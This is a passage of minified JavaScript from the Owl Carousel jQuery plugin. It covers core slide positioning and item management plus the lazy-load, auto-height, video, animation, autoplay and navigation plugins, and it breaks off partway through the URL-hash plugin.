            o = e ? 0 : this._clones.length;
        return !this.isNumeric(t) || n < 1 ? t = i : (t < 0 || t >= n + o) && (t = ((t - o / 2) % n + n) % n + o / 2), t
    }, o.prototype.relative = function(t) {
        return t -= this._clones.length / 2, this.normalize(t, !0)
    }, o.prototype.maximum = function(t) {
        var e, n, i, o = this.settings,
            r = this._coordinates.length;
        if (o.loop) r = this._clones.length / 2 + this._items.length - 1;
        else if (o.autoWidth || o.merge) {
            for (e = this._items.length, n = this._items[--e].width(), i = this.$element.width(); e-- && !((n += this._items[e].width() + this.settings.margin) > i););
            r = e + 1
        } else r = o.center ? this._items.length - 1 : this._items.length - o.items;
        return t && (r -= this._clones.length / 2), Math.max(r, 0)
    }, o.prototype.minimum = function(t) {
        return t ? 0 : this._clones.length / 2
    }, o.prototype.items = function(t) {
        return t === i ? this._items.slice() : (t = this.normalize(t, !0), this._items[t])
    }, o.prototype.mergers = function(t) {
        return t === i ? this._mergers.slice() : (t = this.normalize(t, !0), this._mergers[t])
    }, o.prototype.clones = function(e) {
        var n = this._clones.length / 2,
            o = n + this._items.length,
            r = function(t) {
                return t % 2 == 0 ? o + t / 2 : n - (t + 1) / 2
            };
        return e === i ? t.map(this._clones, (function(t, e) {
            return r(e)
        })) : t.map(this._clones, (function(t, n) {
            return t === e ? r(n) : null
        }))
    }, o.prototype.speed = function(t) {
        return t !== i && (this._speed = t), this._speed
    }, o.prototype.coordinates = function(e) {
        var n, o = 1,
            r = e - 1;
        return e === i ? t.map(this._coordinates, t.proxy((function(t, e) {
            return this.coordinates(e)
        }), this)) : (this.settings.center ? (this.settings.rtl && (o = -1, r = e + 1), n = this._coordinates[e], n += (this.width() - n + (this._coordinates[r] || 0)) / 2 * o) : n = this._coordinates[r] || 0, n = Math.ceil(n))
    }, o.prototype.duration = function(t, e, n) {
        return 0 === n ? 0 : Math.min(Math.max(Math.abs(e - t), 1), 6) * Math.abs(n || this.settings.smartSpeed)
    }, o.prototype.to = function(t, e) {
        var n = this.current(),
            i = null,
            o = t - this.relative(n),
            r = (o > 0) - (o < 0),
            s = this._items.length,
            a = this.minimum(),
            l = this.maximum();
        this.settings.loop ? (!this.settings.rewind && Math.abs(o) > s / 2 && (o += -1 * r * s), (i = (((t = n + o) - a) % s + s) % s + a) !== t && i - o <= l && i - o > 0 && (n = i - o, t = i, this.reset(n))) : this.settings.rewind ? t = (t % (l += 1) + l) % l : t = Math.max(a, Math.min(l, t)), this.speed(this.duration(n, t, e)), this.current(t), this.$element.is(":visible") && this.update()
    }, o.prototype.next = function(t) {
        t = t || !1, this.to(this.relative(this.current()) + 1, t)
    }, o.prototype.prev = function(t) {
        t = t || !1, this.to(this.relative(this.current()) - 1, t)
    }, o.prototype.onTransitionEnd = function(t) {
        if (t !== i && (t.stopPropagation(), (t.target || t.srcElement || t.originalTarget) !== this.$stage.get(0))) return !1;
        this.leave("animating"), this.trigger("translated")
    }, o.prototype.viewport = function() {
        var i;
        return this.options.responsiveBaseElement !== e ? i = t(this.options.responsiveBaseElement).width() : e.innerWidth ? i = e.innerWidth : n.documentElement && n.documentElement.clientWidth ? i = n.documentElement.clientWidth : console.warn("Can not detect viewport width."), i
    }, o.prototype.replace = function(e) {
        this.$stage.empty(), this._items = [], e && (e = e instanceof jQuery ? e : t(e)), this.settings.nestedItemSelector && (e = e.find("." + this.settings.nestedItemSelector)), e.filter((function() {
            return 1 === this.nodeType
        })).each(t.proxy((function(t, e) {
            e = this.prepare(e), this.$stage.append(e), this._items.push(e), this._mergers.push(1 * e.find("[data-merge]").addBack("[data-merge]").attr("data-merge") || 1)
        }), this)), this.reset(this.isNumeric(this.settings.startPosition) ? this.settings.startPosition : 0), this.invalidate("items")
    }, o.prototype.add = function(e, n) {
        var o = this.relative(this._current);
        n = n === i ? this._items.length : this.normalize(n, !0), e = e instanceof jQuery ? e : t(e), this.trigger("add", {
            content: e,
            position: n
        }), e = this.prepare(e), 0 === this._items.length || n === this._items.length ? (0 === this._items.length && this.$stage.append(e), 0 !== this._items.length && this._items[n - 1].after(e), this._items.push(e), this._mergers.push(1 * e.find("[data-merge]").addBack("[data-merge]").attr("data-merge") || 1)) : (this._items[n].before(e), this._items.splice(n, 0, e), this._mergers.splice(n, 0, 1 * e.find("[data-merge]").addBack("[data-merge]").attr("data-merge") || 1)), this._items[o] && this.reset(this._items[o].index()), this.invalidate("items"), this.trigger("added", {
            content: e,
            position: n
        })
    }, o.prototype.remove = function(t) {
        (t = this.normalize(t, !0)) !== i && (this.trigger("remove", {
            content: this._items[t],
            position: t
        }), this._items[t].remove(), this._items.splice(t, 1), this._mergers.splice(t, 1), this.invalidate("items"), this.trigger("removed", {
            content: null,
            position: t
        }))
    }, o.prototype.preloadAutoWidthImages = function(e) {
        e.each(t.proxy((function(e, n) {
            this.enter("pre-loading"), n = t(n), t(new Image).one("load", t.proxy((function(t) {
                n.attr("src", t.target.src), n.css("opacity", 1), this.leave("pre-loading"), !this.is("pre-loading") && !this.is("initializing") && this.refresh()
            }), this)).attr("src", n.attr("src") || n.attr("data-src") || n.attr("data-src-retina"))
        }), this))
    }, o.prototype.destroy = function() {
        for (var i in this.$element.off(".owl.core"), this.$stage.off(".owl.core"), t(n).off(".owl.core"), !1 !== this.settings.responsive && (e.clearTimeout(this.resizeTimer), this.off(e, "resize", this._handlers.onThrottledResize)), this._plugins) this._plugins[i].destroy();
        this.$stage.children(".cloned").remove(), this.$stage.unwrap(), this.$stage.children().contents().unwrap(), this.$stage.children().unwrap(), this.$element.removeClass(this.options.refreshClass).removeClass(this.options.loadingClass).removeClass(this.options.loadedClass).removeClass(this.options.rtlClass).removeClass(this.options.dragClass).removeClass(this.options.grabClass).attr("class", this.$element.attr("class").replace(new RegExp(this.options.responsiveClass + "-\\S+\\s", "g"), "")).removeData("owl.carousel")
    }, o.prototype.op = function(t, e, n) {
        var i = this.settings.rtl;
        switch (e) {
            case "<":
                return i ? t > n : t < n;
            case ">":
                return i ? t < n : t > n;
            case ">=":
                return i ? t <= n : t >= n;
            case "<=":
                return i ? t >= n : t <= n
        }
    }, o.prototype.on = function(t, e, n, i) {
        t.addEventListener ? t.addEventListener(e, n, i) : t.attachEvent && t.attachEvent("on" + e, n)
    }, o.prototype.off = function(t, e, n, i) {
        t.removeEventListener ? t.removeEventListener(e, n, i) : t.detachEvent && t.detachEvent("on" + e, n)
    }, o.prototype.trigger = function(e, n, i, r, s) {
        var a = {
                item: {
                    count: this._items.length,
                    index: this.current()
                }
            },
            l = t.camelCase(t.grep(["on", e, i], (function(t) {
                return t
            })).join("-").toLowerCase()),
            c = t.Event([e, "owl", i || "carousel"].join(".").toLowerCase(), t.extend({
                relatedTarget: this
            }, a, n));
        return this._supress[e] || (t.each(this._plugins, (function(t, e) {
            e.onTrigger && e.onTrigger(c)
        })), this.register({
            type: o.Type.Event,
            name: e
        }), this.$element.trigger(c), this.settings && "function" == typeof this.settings[l] && this.settings[l].call(this, c)), c
    }, o.prototype.enter = function(e) {
        t.each([e].concat(this._states.tags[e] || []), t.proxy((function(t, e) {
            this._states.current[e] === i && (this._states.current[e] = 0), this._states.current[e]++
        }), this))
    }, o.prototype.leave = function(e) {
        t.each([e].concat(this._states.tags[e] || []), t.proxy((function(t, e) {
            this._states.current[e]--
        }), this))
    }, o.prototype.register = function(e) {
        if (e.type === o.Type.Event) {
            if (t.event.special[e.name] || (t.event.special[e.name] = {}), !t.event.special[e.name].owl) {
                var n = t.event.special[e.name]._default;
                t.event.special[e.name]._default = function(t) {
                    return !n || !n.apply || t.namespace && -1 !== t.namespace.indexOf("owl") ? t.namespace && t.namespace.indexOf("owl") > -1 : n.apply(this, arguments)
                }, t.event.special[e.name].owl = !0
            }
        } else e.type === o.Type.State && (this._states.tags[e.name] ? this._states.tags[e.name] = this._states.tags[e.name].concat(e.tags) : this._states.tags[e.name] = e.tags, this._states.tags[e.name] = t.grep(this._states.tags[e.name], t.proxy((function(n, i) {
            return t.inArray(n, this._states.tags[e.name]) === i
        }), this)))
    }, o.prototype.suppress = function(e) {
        t.each(e, t.proxy((function(t, e) {
            this._supress[e] = !0
        }), this))
    }, o.prototype.release = function(e) {
        t.each(e, t.proxy((function(t, e) {
            delete this._supress[e]
        }), this))
    }, o.prototype.pointer = function(t) {
        var n = {
            x: null,
            y: null
        };
        return (t = (t = t.originalEvent || t || e.event).touches && t.touches.length ? t.touches[0] : t.changedTouches && t.changedTouches.length ? t.changedTouches[0] : t).pageX ? (n.x = t.pageX, n.y = t.pageY) : (n.x = t.clientX, n.y = t.clientY), n
    }, o.prototype.isNumeric = function(t) {
        return !isNaN(parseFloat(t))
    }, o.prototype.difference = function(t, e) {
        return {
            x: t.x - e.x,
            y: t.y - e.y
        }
    }, t.fn.owlCarousel = function(e) {
        var n = Array.prototype.slice.call(arguments, 1);
        return this.each((function() {
            var i = t(this),
                r = i.data("owl.carousel");
            r || (r = new o(this, "object" == typeof e && e), i.data("owl.carousel", r), t.each(["next", "prev", "to", "destroy", "refresh", "replace", "add", "remove"], (function(e, n) {
                r.register({
                    type: o.Type.Event,
                    name: n
                }), r.$element.on(n + ".owl.carousel.core", t.proxy((function(t) {
                    t.namespace && t.relatedTarget !== this && (this.suppress([n]), r[n].apply(this, [].slice.call(arguments, 1)), this.release([n]))
                }), r))
            }))), "string" == typeof e && "_" !== e.charAt(0) && r[e].apply(r, n)
        }))
    }, t.fn.owlCarousel.Constructor = o
}(window.Zepto || window.jQuery, window, document),
function(t, e, n, i) {
    var o = function(e) {
        this._core = e, this._interval = null, this._visible = null, this._handlers = {
            "initialized.owl.carousel": t.proxy((function(t) {
                t.namespace && this._core.settings.autoRefresh && this.watch()
            }), this)
        }, this._core.options = t.extend({}, o.Defaults, this._core.options), this._core.$element.on(this._handlers)
    };
    o.Defaults = {
        autoRefresh: !0,
        autoRefreshInterval: 500
    }, o.prototype.watch = function() {
        this._interval || (this._visible = this._core.$element.is(":visible"), this._interval = e.setInterval(t.proxy(this.refresh, this), this._core.settings.autoRefreshInterval))
    }, o.prototype.refresh = function() {
        this._core.$element.is(":visible") !== this._visible && (this._visible = !this._visible, this._core.$element.toggleClass("owl-hidden", !this._visible), this._visible && this._core.invalidate("width") && this._core.refresh())
    }, o.prototype.destroy = function() {
        var t, n;
        for (t in e.clearInterval(this._interval), this._handlers) this._core.$element.off(t, this._handlers[t]);
        for (n in Object.getOwnPropertyNames(this)) "function" != typeof this[n] && (this[n] = null)
    }, t.fn.owlCarousel.Constructor.Plugins.AutoRefresh = o
}(window.Zepto || window.jQuery, window, document),
function(t, e, n, i) {
    var o = function(e) {
        this._core = e, this._loaded = [], this._handlers = {
            "initialized.owl.carousel change.owl.carousel resized.owl.carousel": t.proxy((function(e) {
                if (e.namespace && this._core.settings && this._core.settings.lazyLoad && (e.property && "position" == e.property.name || "initialized" == e.type))
                    for (var n = this._core.settings, i = n.center && Math.ceil(n.items / 2) || n.items, o = n.center && -1 * i || 0, r = (e.property && undefined !== e.property.value ? e.property.value : this._core.current()) + o, s = this._core.clones().length, a = t.proxy((function(t, e) {
                            this.load(e)
                        }), this); o++ < i;) this.load(s / 2 + this._core.relative(r)), s && t.each(this._core.clones(this._core.relative(r)), a), r++
            }), this)
        }, this._core.options = t.extend({}, o.Defaults, this._core.options), this._core.$element.on(this._handlers)
    };
    o.Defaults = {
        lazyLoad: !1
    }, o.prototype.load = function(n) {
        var i = this._core.$stage.children().eq(n),
            o = i && i.find(".owl-lazy");
        !o || t.inArray(i.get(0), this._loaded) > -1 || (o.each(t.proxy((function(n, i) {
            var o, r = t(i),
                s = e.devicePixelRatio > 1 && r.attr("data-src-retina") || r.attr("data-src");
            this._core.trigger("load", {
                element: r,
                url: s
            }, "lazy"), r.is("img") ? r.one("load.owl.lazy", t.proxy((function() {
                r.css("opacity", 1), this._core.trigger("loaded", {
                    element: r,
                    url: s
                }, "lazy")
            }), this)).attr("src", s) : ((o = new Image).onload = t.proxy((function() {
                r.css({
                    "background-image": 'url("' + s + '")',
                    opacity: "1"
                }), this._core.trigger("loaded", {
                    element: r,
                    url: s
                }, "lazy")
            }), this), o.src = s)
        }), this)), this._loaded.push(i.get(0)))
    }, o.prototype.destroy = function() {
        var t, e;
        for (t in this.handlers) this._core.$element.off(t, this.handlers[t]);
        for (e in Object.getOwnPropertyNames(this)) "function" != typeof this[e] && (this[e] = null)
    }, t.fn.owlCarousel.Constructor.Plugins.Lazy = o
}(window.Zepto || window.jQuery, window, document),
function(t, e, n, i) {
    var o = function(e) {
        this._core = e, this._handlers = {
            "initialized.owl.carousel refreshed.owl.carousel": t.proxy((function(t) {
                t.namespace && this._core.settings.autoHeight && this.update()
            }), this),
            "changed.owl.carousel": t.proxy((function(t) {
                t.namespace && this._core.settings.autoHeight && "position" == t.property.name && this.update()
            }), this),
            "loaded.owl.lazy": t.proxy((function(t) {
                t.namespace && this._core.settings.autoHeight && t.element.closest("." + this._core.settings.itemClass).index() === this._core.current() && this.update()
            }), this)
        }, this._core.options = t.extend({}, o.Defaults, this._core.options), this._core.$element.on(this._handlers)
    };
    o.Defaults = {
        autoHeight: !1,
        autoHeightClass: "owl-height"
    }, o.prototype.update = function() {
        var e, n = this._core._current,
            i = n + this._core.settings.items,
            o = this._core.$stage.children().toArray().slice(n, i),
            r = [];
        t.each(o, (function(e, n) {
            r.push(t(n).height())
        })), e = Math.max.apply(null, r), this._core.$stage.parent().height(e).addClass(this._core.settings.autoHeightClass)
    }, o.prototype.destroy = function() {
        var t, e;
        for (t in this._handlers) this._core.$element.off(t, this._handlers[t]);
        for (e in Object.getOwnPropertyNames(this)) "function" != typeof this[e] && (this[e] = null)
    }, t.fn.owlCarousel.Constructor.Plugins.AutoHeight = o
}(window.Zepto || window.jQuery, window, document),
function(t, e, n, i) {
    var o = function(e) {
        this._core = e, this._videos = {}, this._playing = null, this._handlers = {
            "initialized.owl.carousel": t.proxy((function(t) {
                t.namespace && this._core.register({
                    type: "state",
                    name: "playing",
                    tags: ["interacting"]
                })
            }), this),
            "resize.owl.carousel": t.proxy((function(t) {
                t.namespace && this._core.settings.video && this.isInFullScreen() && t.preventDefault()
            }), this),
            "refreshed.owl.carousel": t.proxy((function(t) {
                t.namespace && this._core.is("resizing") && this._core.$stage.find(".cloned .owl-video-frame").remove()
            }), this),
            "changed.owl.carousel": t.proxy((function(t) {
                t.namespace && "position" === t.property.name && this._playing && this.stop()
            }), this),
            "prepared.owl.carousel": t.proxy((function(e) {
                if (e.namespace) {
                    var n = t(e.content).find(".owl-video");
                    n.length && (n.css("display", "none"), this.fetch(n, t(e.content)))
                }
            }), this)
        }, this._core.options = t.extend({}, o.Defaults, this._core.options), this._core.$element.on(this._handlers), this._core.$element.on("click.owl.video", ".owl-video-play-icon", t.proxy((function(t) {
            this.play(t)
        }), this))
    };
    o.Defaults = {
        video: !1,
        videoHeight: !1,
        videoWidth: !1
    }, o.prototype.fetch = function(t, e) {
        var n = t.attr("data-vimeo-id") ? "vimeo" : t.attr("data-vzaar-id") ? "vzaar" : "youtube",
            i = t.attr("data-vimeo-id") || t.attr("data-youtube-id") || t.attr("data-vzaar-id"),
            o = t.attr("data-width") || this._core.settings.videoWidth,
            r = t.attr("data-height") || this._core.settings.videoHeight,
            s = t.attr("href");
        if (!s) throw new Error("Missing video URL.");
        if ((i = s.match(/(http:|https:|)\/\/(player.|www.|app.)?(vimeo\.com|youtu(be\.com|\.be|be\.googleapis\.com)|vzaar\.com)\/(video\/|videos\/|embed\/|channels\/.+\/|groups\/.+\/|watch\?v=|v\/)?([A-Za-z0-9._%-]*)(\&\S+)?/))[3].indexOf("youtu") > -1) n = "youtube";
        else if (i[3].indexOf("vimeo") > -1) n = "vimeo";
        else {
            if (!(i[3].indexOf("vzaar") > -1)) throw new Error("Video URL not supported.");
            n = "vzaar"
        }
        i = i[6], this._videos[s] = {
            type: n,
            id: i,
            width: o,
            height: r
        }, e.attr("data-video", s), this.thumbnail(t, this._videos[s])
    }, o.prototype.thumbnail = function(e, n) {
        var i, o, r = n.width && n.height ? 'style="width:' + n.width + "px;height:" + n.height + 'px;"' : "",
            s = e.find("img"),
            a = "src",
            l = "",
            c = this._core.settings,
            u = function(t) {
                '<div class="owl-video-play-icon"></div>',
                i = c.lazyLoad ? '<div class="owl-video-tn ' + l + '" ' + a + '="' + t + '"></div>' : '<div class="owl-video-tn" style="opacity:1;background-image:url(' + t + ')"></div>',
                e.after(i),
                e.after('<div class="owl-video-play-icon"></div>')
            };
        if (e.wrap('<div class="owl-video-wrapper"' + r + "></div>"), this._core.settings.lazyLoad && (a = "data-src", l = "owl-lazy"), s.length) return u(s.attr(a)), s.remove(), !1;
        "youtube" === n.type ? (o = "//img.youtube.com/vi/" + n.id + "/hqdefault.jpg", u(o)) : "vimeo" === n.type ? t.ajax({
            type: "GET",
            url: "//vimeo.com/api/v2/video/" + n.id + ".json",
            jsonp: "callback",
            dataType: "jsonp",
            success: function(t) {
                o = t[0].thumbnail_large, u(o)
            }
        }) : "vzaar" === n.type && t.ajax({
            type: "GET",
            url: "//vzaar.com/api/videos/" + n.id + ".json",
            jsonp: "callback",
            dataType: "jsonp",
            success: function(t) {
                o = t.framegrab_url, u(o)
            }
        })
    }, o.prototype.stop = function() {
        this._core.trigger("stop", null, "video"), this._playing.find(".owl-video-frame").remove(), this._playing.removeClass("owl-video-playing"), this._playing = null, this._core.leave("playing"), this._core.trigger("stopped", null, "video")
    }, o.prototype.play = function(e) {
        var n, i = t(e.target).closest("." + this._core.settings.itemClass),
            o = this._videos[i.attr("data-video")],
            r = o.width || "100%",
            s = o.height || this._core.$stage.height();
        this._playing || (this._core.enter("playing"), this._core.trigger("play", null, "video"), i = this._core.items(this._core.relative(i.index())), this._core.reset(i.index()), "youtube" === o.type ? n = '<iframe width="' + r + '" height="' + s + '" src="//www.youtube.com/embed/' + o.id + "?autoplay=1&rel=0&v=" + o.id + '" frameborder="0" allowfullscreen></iframe>' : "vimeo" === o.type ? n = '<iframe src="//player.vimeo.com/video/' + o.id + '?autoplay=1" width="' + r + '" height="' + s + '" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>' : "vzaar" === o.type && (n = '<iframe frameborder="0"height="' + s + '"width="' + r + '" allowfullscreen mozallowfullscreen webkitAllowFullScreen src="//view.vzaar.com/' + o.id + '/player?autoplay=true"></iframe>'), t('<div class="owl-video-frame">' + n + "</div>").insertAfter(i.find(".owl-video")), this._playing = i.addClass("owl-video-playing"))
    }, o.prototype.isInFullScreen = function() {
        var e = n.fullscreenElement || n.mozFullScreenElement || n.webkitFullscreenElement;
        return e && t(e).parent().hasClass("owl-video-frame")
    }, o.prototype.destroy = function() {
        var t, e;
        for (t in this._core.$element.off("click.owl.video"), this._handlers) this._core.$element.off(t, this._handlers[t]);
        for (e in Object.getOwnPropertyNames(this)) "function" != typeof this[e] && (this[e] = null)
    }, t.fn.owlCarousel.Constructor.Plugins.Video = o
}(window.Zepto || window.jQuery, window, document),
function(t, e, n, i) {
    var o = function(e) {
        this.core = e, this.core.options = t.extend({}, o.Defaults, this.core.options), this.swapping = !0, this.previous = i, this.next = i, this.handlers = {
            "change.owl.carousel": t.proxy((function(t) {
                t.namespace && "position" == t.property.name && (this.previous = this.core.current(), this.next = t.property.value)
            }), this),
            "drag.owl.carousel dragged.owl.carousel translated.owl.carousel": t.proxy((function(t) {
                t.namespace && (this.swapping = "translated" == t.type)
            }), this),
            "translate.owl.carousel": t.proxy((function(t) {
                t.namespace && this.swapping && (this.core.options.animateOut || this.core.options.animateIn) && this.swap()
            }), this)
        }, this.core.$element.on(this.handlers)
    };
    o.Defaults = {
        animateOut: !1,
        animateIn: !1
    }, o.prototype.swap = function() {
        if (1 === this.core.settings.items && t.support.animation && t.support.transition) {
            this.core.speed(0);
            var e, n = t.proxy(this.clear, this),
                i = this.core.$stage.children().eq(this.previous),
                o = this.core.$stage.children().eq(this.next),
                r = this.core.settings.animateIn,
                s = this.core.settings.animateOut;
            this.core.current() !== this.previous && (s && (e = this.core.coordinates(this.previous) - this.core.coordinates(this.next), i.one(t.support.animation.end, n).css({
                left: e + "px"
            }).addClass("animated owl-animated-out").addClass(s)), r && o.one(t.support.animation.end, n).addClass("animated owl-animated-in").addClass(r))
        }
    }, o.prototype.clear = function(e) {
        t(e.target).css({
            left: ""
        }).removeClass("animated owl-animated-out owl-animated-in").removeClass(this.core.settings.animateIn).removeClass(this.core.settings.animateOut), this.core.onTransitionEnd()
    }, o.prototype.destroy = function() {
        var t, e;
        for (t in this.handlers) this.core.$element.off(t, this.handlers[t]);
        for (e in Object.getOwnPropertyNames(this)) "function" != typeof this[e] && (this[e] = null)
    }, t.fn.owlCarousel.Constructor.Plugins.Animate = o
}(window.Zepto || window.jQuery, window, document),
function(t, e, n, i) {
    var o = function(e) {
        this._core = e, this._timeout = null, this._paused = !1, this._handlers = {
            "changed.owl.carousel": t.proxy((function(t) {
                t.namespace && "settings" === t.property.name ? this._core.settings.autoplay ? this.play() : this.stop() : t.namespace && "position" === t.property.name && this._core.settings.autoplay && this._setAutoPlayInterval()
            }), this),
            "initialized.owl.carousel": t.proxy((function(t) {
                t.namespace && this._core.settings.autoplay && this.play()
            }), this),
            "play.owl.autoplay": t.proxy((function(t, e, n) {
                t.namespace && this.play(e, n)
            }), this),
            "stop.owl.autoplay": t.proxy((function(t) {
                t.namespace && this.stop()
            }), this),
            "mouseover.owl.autoplay": t.proxy((function() {
                this._core.settings.autoplayHoverPause && this._core.is("rotating") && this.pause()
            }), this),
            "mouseleave.owl.autoplay": t.proxy((function() {
                this._core.settings.autoplayHoverPause && this._core.is("rotating") && this.play()
            }), this),
            "touchstart.owl.core": t.proxy((function() {
                this._core.settings.autoplayHoverPause && this._core.is("rotating") && this.pause()
            }), this),
            "touchend.owl.core": t.proxy((function() {
                this._core.settings.autoplayHoverPause && this.play()
            }), this)
        }, this._core.$element.on(this._handlers), this._core.options = t.extend({}, o.Defaults, this._core.options)
    };
    o.Defaults = {
        autoplay: !1,
        autoplayTimeout: 5e3,
        autoplayHoverPause: !1,
        autoplaySpeed: !1
    }, o.prototype.play = function(t, e) {
        this._paused = !1, this._core.is("rotating") || (this._core.enter("rotating"), this._setAutoPlayInterval())
    }, o.prototype._getNextTimeout = function(i, o) {
        return this._timeout && e.clearTimeout(this._timeout), e.setTimeout(t.proxy((function() {
            this._paused || this._core.is("busy") || this._core.is("interacting") || n.hidden || this._core.next(o || this._core.settings.autoplaySpeed)
        }), this), i || this._core.settings.autoplayTimeout)
    }, o.prototype._setAutoPlayInterval = function() {
        this._timeout = this._getNextTimeout()
    }, o.prototype.stop = function() {
        this._core.is("rotating") && (e.clearTimeout(this._timeout), this._core.leave("rotating"))
    }, o.prototype.pause = function() {
        this._core.is("rotating") && (this._paused = !0)
    }, o.prototype.destroy = function() {
        var t, e;
        for (t in this.stop(), this._handlers) this._core.$element.off(t, this._handlers[t]);
        for (e in Object.getOwnPropertyNames(this)) "function" != typeof this[e] && (this[e] = null)
    }, t.fn.owlCarousel.Constructor.Plugins.autoplay = o
}(window.Zepto || window.jQuery, window, document),
function(t, e, n, i) {
    "use strict";
    var o = function(e) {
        this._core = e, this._initialized = !1, this._pages = [], this._controls = {}, this._templates = [], this.$element = this._core.$element, this._overrides = {
            next: this._core.next,
            prev: this._core.prev,
            to: this._core.to
        }, this._handlers = {
            "prepared.owl.carousel": t.proxy((function(e) {
                e.namespace && this._core.settings.dotsData && this._templates.push('<div class="' + this._core.settings.dotClass + '">' + t(e.content).find("[data-dot]").addBack("[data-dot]").attr("data-dot") + "</div>")
            }), this),
            "added.owl.carousel": t.proxy((function(t) {
                t.namespace && this._core.settings.dotsData && this._templates.splice(t.position, 0, this._templates.pop())
            }), this),
            "remove.owl.carousel": t.proxy((function(t) {
                t.namespace && this._core.settings.dotsData && this._templates.splice(t.position, 1)
            }), this),
            "changed.owl.carousel": t.proxy((function(t) {
                t.namespace && "position" == t.property.name && this.draw()
            }), this),
            "initialized.owl.carousel": t.proxy((function(t) {
                t.namespace && !this._initialized && (this._core.trigger("initialize", null, "navigation"), this.initialize(), this.update(), this.draw(), this._initialized = !0, this._core.trigger("initialized", null, "navigation"))
            }), this),
            "refreshed.owl.carousel": t.proxy((function(t) {
                t.namespace && this._initialized && (this._core.trigger("refresh", null, "navigation"), this.update(), this.draw(), this._core.trigger("refreshed", null, "navigation"))
            }), this)
        }, this._core.options = t.extend({}, o.Defaults, this._core.options), this.$element.on(this._handlers)
    };
    o.Defaults = {
        nav: !1,
        navText: ["prev", "next"],
        navSpeed: !1,
        navElement: "div",
        navContainer: !1,
        navContainerClass: "owl-nav",
        navClass: ["owl-prev", "owl-next"],
        slideBy: 1,
        dotClass: "owl-dot",
        dotsClass: "owl-dots",
        dots: !0,
        dotsEach: !1,
        dotsData: !1,
        dotsSpeed: !1,
        dotsContainer: !1
    }, o.prototype.initialize = function() {
        var e, n = this._core.settings;
        for (e in this._controls.$relative = (n.navContainer ? t(n.navContainer) : t("<div>").addClass(n.navContainerClass).appendTo(this.$element)).addClass("disabled"), this._controls.$previous = t("<" + n.navElement + ">").addClass(n.navClass[0]).html(n.navText[0]).prependTo(this._controls.$relative).on("click", t.proxy((function(t) {
                this.prev(n.navSpeed)
            }), this)), this._controls.$next = t("<" + n.navElement + ">").addClass(n.navClass[1]).html(n.navText[1]).appendTo(this._controls.$relative).on("click", t.proxy((function(t) {
                this.next(n.navSpeed)
            }), this)), n.dotsData || (this._templates = [t("<div>").addClass(n.dotClass).append(t("<span>")).prop("outerHTML")]), this._controls.$absolute = (n.dotsContainer ? t(n.dotsContainer) : t("<div>").addClass(n.dotsClass).appendTo(this.$element)).addClass("disabled"), this._controls.$absolute.on("click", "div", t.proxy((function(e) {
                var i = t(e.target).parent().is(this._controls.$absolute) ? t(e.target).index() : t(e.target).parent().index();
                e.preventDefault(), this.to(i, n.dotsSpeed)
            }), this)), this._overrides) this._core[e] = t.proxy(this[e], this)
    }, o.prototype.destroy = function() {
        var t, e, n, i;
        for (t in this._handlers) this.$element.off(t, this._handlers[t]);
        for (e in this._controls) this._controls[e].remove();
        for (i in this.overides) this._core[i] = this._overrides[i];
        for (n in Object.getOwnPropertyNames(this)) "function" != typeof this[n] && (this[n] = null)
    }, o.prototype.update = function() {
        var t, e, n = this._core.clones().length / 2,
            i = n + this._core.items().length,
            o = this._core.maximum(!0),
            r = this._core.settings,
            s = r.center || r.autoWidth || r.dotsData ? 1 : r.dotsEach || r.items;
        if ("page" !== r.slideBy && (r.slideBy = Math.min(r.slideBy, r.items)), r.dots || "page" == r.slideBy)
            for (this._pages = [], t = n, e = 0, 0; t < i; t++) {
                if (e >= s || 0 === e) {
                    if (this._pages.push({
                            start: Math.min(o, t - n),
                            end: t - n + s - 1
                        }), Math.min(o, t - n) === o) break;
                    e = 0
                }
                e += this._core.mergers(this._core.relative(t))
            }
    }, o.prototype.draw = function() {
        var e, n = this._core.settings,
            i = this._core.items().length <= n.items,
            o = this._core.relative(this._core.current()),
            r = n.loop || n.rewind;
        this._controls.$relative.toggleClass("disabled", !n.nav || i), n.nav && (this._controls.$previous.toggleClass("disabled", !r && o <= this._core.minimum(!0)), this._controls.$next.toggleClass("disabled", !r && o >= this._core.maximum(!0))), this._controls.$absolute.toggleClass("disabled", !n.dots || i), n.dots && (e = this._pages.length - this._controls.$absolute.children().length, n.dotsData && 0 !== e ? this._controls.$absolute.html(this._templates.join("")) : e > 0 ? this._controls.$absolute.append(new Array(e + 1).join(this._templates[0])) : e < 0 && this._controls.$absolute.children().slice(e).remove(), this._controls.$absolute.find(".active").removeClass("active"), this._controls.$absolute.children().eq(t.inArray(this.current(), this._pages)).addClass("active"))
    }, o.prototype.onTrigger = function(e) {
        var n = this._core.settings;
        e.page = {
            index: t.inArray(this.current(), this._pages),
            count: this._pages.length,
            size: n && (n.center || n.autoWidth || n.dotsData ? 1 : n.dotsEach || n.items)
        }
    }, o.prototype.current = function() {
        var e = this._core.relative(this._core.current());
        return t.grep(this._pages, t.proxy((function(t, n) {
            return t.start <= e && t.end >= e
        }), this)).pop()
    }, o.prototype.getPosition = function(e) {
        var n, i, o = this._core.settings;
        return "page" == o.slideBy ? (n = t.inArray(this.current(), this._pages), i = this._pages.length, e ? ++n : --n, n = this._pages[(n % i + i) % i].start) : (n = this._core.relative(this._core.current()), i = this._core.items().length, e ? n += o.slideBy : n -= o.slideBy), n
    }, o.prototype.next = function(e) {
        t.proxy(this._overrides.to, this._core)(this.getPosition(!0), e)
    }, o.prototype.prev = function(e) {
        t.proxy(this._overrides.to, this._core)(this.getPosition(!1), e)
    }, o.prototype.to = function(e, n, i) {
        var o;
        !i && this._pages.length ? (o = this._pages.length, t.proxy(this._overrides.to, this._core)(this._pages[(e % o + o) % o].start, n)) : t.proxy(this._overrides.to, this._core)(e, n)
    }, t.fn.owlCarousel.Constructor.Plugins.Navigation = o
}(window.Zepto || window.jQuery, window, document),
function(t, e, n, i) {
    "use strict";
    var o = function(n) {
        this._core = n, this._hashes = {}, this.$element = this._core.$element, this._handlers = {
            "initialized.owl.carousel": t.proxy((function(n) {
                n.namespace && "URLHash" === this._core.settings.startPosition && t(e).trigger("hashchange.owl.navigation")
            }), this),
            "prepared.owl.carousel": t.proxy((function(e) {
                if (e.namespace) {
                    var n = t(e.content).find("[data-hash]").addBack("[data-hash]").attr("data-hash");
                    if (!n) return;
                    this._hashes[n] = e.content
                }
            }), this),
            "changed.owl.carousel": t.proxy((function(n) {
                if (n.namespace && "position" === n.property.name) {
                    var i = this._core.items(this._core.relative(this._core.current())),
                        o = t.map(this._hashes, (function(t, e) {
                            return t === i ? e : null
                        })).join();
                    if (!o || e.location.hash.slice(1) === o) return;
